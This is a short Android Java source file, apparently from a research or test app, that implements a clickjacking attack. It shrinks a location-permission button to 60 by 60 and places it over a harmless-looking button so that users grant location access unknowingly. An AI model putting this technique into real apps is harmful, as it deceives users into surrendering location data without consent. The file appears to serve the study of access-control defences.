package com.example.activities.clickjacking.disguise;

import android.support.annotation.NonNull;
import com.acg.EvilApp.R;
import com.example.activities.EvilLocationActivity;
import com.example.evildoers.EvilDoer;
import com.example.evildoers.clickjacking.ModifyViewEvilDoer;

import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

/**
 * Clickjacking activity which modifies the location ACG button to be very small on top of a harmless-looking button
 */
public class SmallButtonLocationActivity extends EvilLocationActivity {

    @NonNull
    @Override
    public Collection<EvilDoer> evilDoers() {
        List<EvilDoer> evilDoers = new ArrayList<>();
        EvilDoer evilDoer = new ModifyViewEvilDoer(R.id.location_acg_button_id, 60, 60);
        evilDoers.add(evilDoer);
        return evilDoers;
    }

    protected int contentView() {
        return R.layout.activity_location_hidden;
    }
}
